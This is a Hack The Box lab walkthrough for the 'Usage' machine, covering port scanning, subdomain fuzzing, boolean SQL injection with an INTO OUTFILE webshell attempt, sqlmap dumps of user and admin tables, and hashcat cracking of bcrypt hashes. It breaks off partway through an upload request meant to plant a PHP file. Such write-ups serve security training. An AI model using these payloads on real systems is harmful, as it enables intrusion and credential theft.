---
layout: post
title: Hack The Box Walkthrough - Usage
date: 2024-07-06
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/07/HTB/Usage
img: 2024/07/Usage/Usage.png
---

In Usage, I had to exploit an SQL Injection and a file upload to get a shell. Then I found a password in a configuration file, and exploited a binary to become root.

* Room: Usage
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Usage](https://app.hackthebox.com/machines/Usage)
* Author: [rajHere](https://app.hackthebox.com/users/396413)

## Enumeration

As always, I started the box by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.154.192:22
Open 10.129.154.192:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 13:50 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
...
Host is up, received reset ttl 63 (0.032s latency).
Scanned at 2024-06-23 13:50:30 EDT for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://usage.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=6/23%OT=22%CT=%CU=35179%PV=Y%DS=2%DC=T%G=N%TM=66786075%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11NW7%O6=M550ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%TG=40%CD=S)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 22.806 days (since Fri May 31 18:29:25 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   31.58 ms 10.10.14.1
2   31.81 ms target (10.129.154.192)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.39 seconds
           Raw packets sent: 63 (5.220KB) | Rcvd: 44 (2.948KB)
```

There were two open ports: 22 (SSH) and 80 (HTTP). A UDP scan did not find anything interesting. The site on port 80 was redirecting to 'usage.htb' so I added that domain to my hosts file and scanned for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.usage.htb" "http://usage.htb"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://usage.htb/
Total requests: 653911

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000015625:   405        23 L     116 W      1007 Ch     "admin"

Total time: 937.3851
Processed Requests: 653911
Filtered Requests: 653910
Requests/sec.: 697.5905
```

It found 'admin.usage.htb'. I added it to my hosts file.

## SQL Injection

I opened a browser on the main website.

![Website](/assets/images/2024/07/Usage/Website.png "Website")

The website required to be logged in. I tried a few credentials, and some simple SQL Injection payloads. They did not work.

There was a form to register a new user and logged in with it.

![Logged in](/assets/images/2024/07/Usage/LoggedIn.png "Logged In")

Once connected, I got access to a few blog posts about penetration testing and Laravel. And that was it. I did not see any API calls, no other functionality that I could abuse.

I kept looking around the site. There was an admin link that took me to 'admin.usage.htb'. This took me to another login page. I tried the credentials of the user I created. They did not work.

![Admin Login](/assets/images/2024/07/Usage/AdminLogin.png "Admin Login")

I looked at the 'Reset Password' page.

![Reset Password](/assets/images/2024/07/Usage/ResetPassword.png "Reset Password")

The page was showing different messages if the user existed or not. I tried to send SQL Injection it. It worked.

![SQL Injection](/assets/images/2024/07/Usage/SQLInjection.png "SQL Injection")

I had a Boolean SQL Injection. I used it to detect how many columns were returned by the query.

![8 Columns](/assets/images/2024/07/Usage/8Columns.png "8 Columns")

I tried to create a PHP file by using `SELECT INTO OUTFILE`.

```bash
' UNION SELECT '<?php echo "in"; ?>', 2, 3, 4, 5, 6, 7, 8 INTO OUTFILE '/var/www/usage/shell.php' -- -
```

I tried a few different paths. They all failed. The MySQL user probably didn't have permission to use `SELECT INTO OUTFILE`. Or it could not write in the paths I tried.

I turned to sqlmap to dump the database. The first few attempts failed to exploit the injection. But once I told it to use Union and Boolean base attack, and increased the level and risk, it worked.

```bash
$ sqlmap --batch --dbms mysql -r request.txt -p email --technique=UB --level 5 --risk 3 --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:12:12 /2024-06-24/

[15:12:12] [INFO] parsing HTTP request from 'request.txt'
[15:12:12] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[15:12:13] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[15:12:13] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[15:12:13] [INFO] testing for SQL injection on POST parameter 'email'
[15:12:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:12:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:12:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:13:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:13:18] [INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable
[15:13:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:13:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:13:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:13:19] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[15:13:38] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[15:13:58] [INFO] testing 'Generic UNION query (25) - 21 to 40 columns'
[15:14:02] [INFO] testing 'Generic UNION query (25) - 41 to 60 columns'
[15:14:03] [INFO] testing 'Generic UNION query (25) - 61 to 80 columns'
[15:14:04] [INFO] testing 'Generic UNION query (25) - 81 to 100 columns'
[15:14:06] [INFO] testing 'MySQL UNION query (25) - 1 to 20 columns'
[15:14:18] [INFO] testing 'MySQL UNION query (25) - 21 to 40 columns'
[15:14:19] [INFO] testing 'MySQL UNION query (25) - 41 to 60 columns'
[15:14:21] [INFO] testing 'MySQL UNION query (25) - 61 to 80 columns'
[15:14:22] [INFO] testing 'MySQL UNION query (25) - 81 to 100 columns'
[15:14:23] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 686 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=dWYzWa8X0JfYL52rQCzGRT9r8uPBIirGVfeyuLlV&email=test@test.com' AND 8499=(SELECT (CASE WHEN (8499=8499) THEN 8499 ELSE (SELECT 2416 UNION SELECT 8537) END))-- -
---
[15:14:28] [INFO] testing MySQL
[15:14:28] [INFO] confirming MySQL
[15:14:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[15:14:29] [INFO] fetching database names
[15:14:29] [INFO] fetching number of databases
[15:14:29] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:14:29] [INFO] retrieved: 3
[15:14:30] [INFO] retrieved: information_schema
[15:14:51] [INFO] retrieved: performance_schema
[15:15:10] [INFO] retrieved: usage_blog
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[15:15:21] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 453 times
[15:15:21] [INFO] fetched data logged to text files under '/home/ehogue/.local/share/sqlmap/output/usage.htb'

[*] ending @ 15:15:21 /2024-06-24/
```

It found three databases. I used it to extract the tables from `usage_blog`.

```bash
$ sqlmap --batch --dbms mysql -r request.txt -p email --technique=UB --level 5 --risk 3 -D usage_blog --tables
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:16:08 /2024-06-24/

[15:16:08] [INFO] parsing HTTP request from 'request.txt'
[15:16:08] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=dWYzWa8X0JfYL52rQCzGRT9r8uPBIirGVfeyuLlV&email=test@test.com' AND 8499=(SELECT (CASE WHEN (8499=8499) THEN 8499 ELSE (SELECT 2416 UNION SELECT 8537) END))-- -
---
[15:16:09] [INFO] testing MySQL
[15:16:09] [INFO] confirming MySQL
[15:16:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[15:16:09] [INFO] fetching tables for database: 'usage_blog'
[15:16:09] [INFO] fetching number of tables for database 'usage_blog'
[15:16:09] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:16:09] [INFO] retrieved:
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
15
[15:16:11] [INFO] retrieved: admin_menu
[15:16:22] [INFO] retrieved: admin_operation_log
[15:16:42] [INFO] retrieved: admin_permissions
[15:16:56] [INFO] retrieved: admin_role_menu
[15:17:09] [INFO] retrieved: admin_role_permissions
[15:17:24] [INFO] retrieved: admin_role_users
[15:17:33] [INFO] retrieved: admin_roles
[15:17:38] [INFO] retrieved: admin_user_permissions
[15:18:05] [INFO] retrieved: admin_users
[15:18:09] [INFO] retrieved: blog
[15:18:14] [INFO] retrieved: failed_jobs
[15:18:27] [INFO] retrieved: migrations
[15:18:37] [INFO] retrieved: password_reset_tokens
[15:19:03] [INFO] retrieved: personal_access_tokens
[15:19:30] [INFO] retrieved: users
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+

[15:19:36] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 504 times
[15:19:36] [INFO] fetched data logged to text files under '/home/ehogue/.local/share/sqlmap/output/usage.htb'

[*] ending @ 15:19:36 /2024-06-24/
```

There were two tables that contained users. One for the main site, and one for the admin site. I dumped both.

```bash
$ sqlmap --batch --dbms mysql -r request.txt -p email --technique=UB --level 5 --risk 3 -D usage_blog -T users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:21:33 /2024-06-24/

[15:21:33] [INFO] parsing HTTP request from 'request.txt'
[15:21:33] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=dWYzWa8X0JfYL52rQCzGRT9r8uPBIirGVfeyuLlV&email=test@test.com' AND 8499=(SELECT (CASE WHEN (8499=8499) THEN 8499 ELSE (SELECT 2416 UNION SELECT 8537) END))-- -
---
[15:21:33] [INFO] testing MySQL
[15:21:33] [INFO] confirming MySQL
[15:21:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[15:21:33] [INFO] fetching columns for table 'users' in database 'usage_blog'
[15:21:33] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:21:33] [INFO] retrieved:
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
8
[15:21:35] [INFO] retrieved: id
[15:21:38] [INFO] retrieved: name
[15:21:49] [INFO] retrieved: email
[15:22:00] [INFO] retrieved: email_verified_at
[15:22:21] [INFO] retrieved: password
[15:22:31] [INFO] retrieved: remember_token
[15:22:46] [INFO] retrieved: created_at
[15:22:58] [INFO] retrieved: updated_at
[15:23:10] [INFO] fetching entries for table 'users' in database 'usage_blog'
[15:23:10] [INFO] fetching number of entries for table 'users' in database 'usage_blog'
[15:23:10] [INFO] retrieved: 2
[15:23:11] [INFO] retrieved: raj
[15:23:14] [INFO] retrieved: 2023-08-17 03:16:02
[15:23:36] [INFO] retrieved: raj@raj.com
[15:23:55] [INFO] retrieved:
[15:23:57] [INFO] retrieved: 1
[15:23:58] [INFO] retrieved: $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.
[15:25:20] [INFO] retrieved:
[15:25:22] [INFO] retrieved: 2023-08-17 03:16:02
[15:25:49] [INFO] retrieved: raj
[15:25:52] [INFO] retrieved: 2023-08-22 08:55:16
[15:26:15] [INFO] retrieved: raj@usage.htb
[15:26:34] [INFO] retrieved:
[15:26:36] [INFO] retrieved: 2
[15:26:37] [INFO] retrieved: $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa
[15:28:07] [INFO] retrieved:
[15:28:09] [INFO] retrieved: 2023-08-22 08:55:16
Database: usage_blog
Table: users
[2 entries]
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| id | email         | name   | password                                                     | created_at          | updated_at          | remember_token | email_verified_at |
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| 1  | raj@raj.com   | raj    | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. | 2023-08-17 03:16:02 | 2023-08-17 03:16:02 | NULL           | NULL              |
| 2  | raj@usage.htb | raj    | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa | 2023-08-22 08:55:16 | 2023-08-22 08:55:16 | NULL           | NULL              |
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+

[15:28:32] [INFO] table 'usage_blog.users' dumped to CSV file '/home/ehogue/.local/share/sqlmap/output/usage.htb/dump/usage_blog/users.csv'
[15:28:32] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1106 times
[15:28:32] [INFO] fetched data logged to text files under '/home/ehogue/.local/share/sqlmap/output/usage.htb'

[*] ending @ 15:28:32 /2024-06-24/
```

```bash
$ sqlmap --batch --dbms mysql -r request.txt -p email --technique=UB --level 5 --risk 3 -D usage_blog -T admin_users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.6.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:31:11 /2024-06-24/

[15:31:11] [INFO] parsing HTTP request from 'request.txt'
[15:31:11] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=dWYzWa8X0JfYL52rQCzGRT9r8uPBIirGVfeyuLlV&email=test@test.com' AND 8499=(SELECT (CASE WHEN (8499=8499) THEN 8499 ELSE (SELECT 2416 UNION SELECT 8537) END))-- -
---
[15:31:11] [INFO] testing MySQL
[15:31:11] [INFO] confirming MySQL
[15:31:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[15:31:11] [INFO] fetching columns for table 'admin_users' in database 'usage_blog'
[15:31:11] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:31:11] [INFO] retrieved:
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
8
[15:31:13] [INFO] retrieved: id
[15:31:15] [INFO] retrieved: username
[15:31:24] [INFO] retrieved: password
[15:31:36] [INFO] retrieved: name
[15:31:41] [INFO] retrieved: avatar
[15:31:47] [INFO] retrieved: remember_token
[15:32:03] [INFO] retrieved: created_at
[15:32:19] [INFO] retrieved: updated_at
[15:32:34] [INFO] fetching entries for table 'admin_users' in database 'usage_blog'
[15:32:34] [INFO] fetching number of entries for table 'admin_users' in database 'usage_blog'
[15:32:34] [INFO] retrieved: 1
[15:32:35] [INFO] retrieved: Administrator
[15:32:49] [INFO] retrieved:
[15:32:49] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[15:32:49] [INFO] retrieved: 2023-08-13 02:48:26
[15:33:14] [INFO] retrieved: 1
[15:33:16] [INFO] retrieved: $2y$10$ohq2       LpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
[15:34:43] [INFO] retrieved: kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT
[15:36:08] [INFO] retrieved: 2023-08-23 06:02:19
[15:36:31] [INFO] retrieved: admin
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+

[15:36:36] [INFO] table 'usage_blog.admin_users' dumped to CSV file '/home/ehogue/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv'
[15:36:36] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 848 times
[15:36:36] [INFO] fetched data logged to text files under '/home/ehogue/.local/share/sqlmap/output/usage.htb'

[*] ending @ 15:36:36 /2024-06-24/
```

All the hashes it found where bcrypt. I saved them to a file and used `hashcat` to crack them.

```bash
$ cat hash.txt
raj@raj.com:$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.
raj@usage.htb:$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa
Administrator:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2


$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt -m 3200 --username
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6848/13761 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:REDACTED
$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa:REDACTED
$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: hash.txt
Time.Started.....: Mon Jun 24 15:40:02 2024 (59 secs)
Time.Estimated...: Mon Jun 24 15:41:01 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      103 H/s (10.72ms) @ Accel:6 Loops:32 Thr:1 Vec:1
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 6588/43033152 (0.02%)
Rejected.........: 0/6588 (0.00%)
Restore.Point....: 2160/14344384 (0.02%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: monalisa -> georgiana
Hardware.Mon.#1..: Util: 85%

Started: Mon Jun 24 15:39:58 2024
Stopped: Mon Jun 24 15:41:02 2024

$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt -m 3200 --username --show
raj@raj.com:$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.:REDACTED
raj@usage.htb:$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa:REDACTED
Administrator:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:REDACTED
```

All three were cracked quickly. I tried to SSH to the server, it failed.

I use the admin credentials to connect to the admin portal.

![Admin Dashboard](/assets/images/2024/07/Usage/AdminDashboard.png "Admin Dashboard")


## Remote Code Execution

I looked around the admin dashboard. There were more functionalities here, mostly around managing users of the application.

The user setting page allowed uploading images.

![User Setting](/assets/images/2024/07/Usage/UserSetting.png "User Setting")

I tried uploading a PHP file. It failed.

![Invalid Type](/assets/images/2024/07/Usage/InvalidType.png "Invalid Type")

The validation was happening client side. I tried to modify a request that worked before to upload a PHP file.


```bash
POST /admin/auth/setting HTTP/1.1
Host: admin.usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-PJAX: true
X-PJAX-Container: #pjax-container
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------108357318173490374446982946
Content-Length: 156318
Origin: http://admin.usage.htb
Connection: keep-alive
Referer: http://admin.usage.htb/admin/auth/setting
